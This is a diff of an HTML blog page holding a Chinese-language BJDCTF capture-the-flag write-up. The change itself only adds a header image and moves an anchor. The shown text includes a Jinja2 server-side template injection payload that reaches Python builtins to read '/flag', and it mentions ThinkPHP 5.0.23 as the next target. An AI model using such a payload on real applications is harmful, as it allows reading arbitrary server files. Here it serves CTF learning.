@@ -122,6 +122,12 @@
                 <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
 <div class="card">
     
+    <div class="card-image">
+        <span  class="image is-7by1">
+            <img class="thumbnail" src="/images/bjdctf.jpg" alt="BJDCTF_writeup">
+        </span>
+    </div>
+    
     <div class="card-content article ">
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
@@ -149,7 +155,8 @@
         </h1>
         <div class="content">
             <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h2><p>在注释里看就是SSTI。</p>
-<p><img src="/2022/03/25/BJDCTF_writeup/批注 2020-03-23 173053.png" alt><br><a id="more"></a></p>
+<a id="more"></a>
+<p><img src="/2022/03/25/BJDCTF_writeup/批注 2020-03-23 173053.png" alt></p>
 <p>不会SSTI，直接在网上找payload打下。</p>
 <figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">177</span>].__init__.__globals__.__builtins__[<span class="hljs-string">'open'</span>](<span class="hljs-string">'/flag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h2><p>主页的黑页提示了是thinkphp5，又整出一个报错页面看到具体版本是5.0.23。</p>
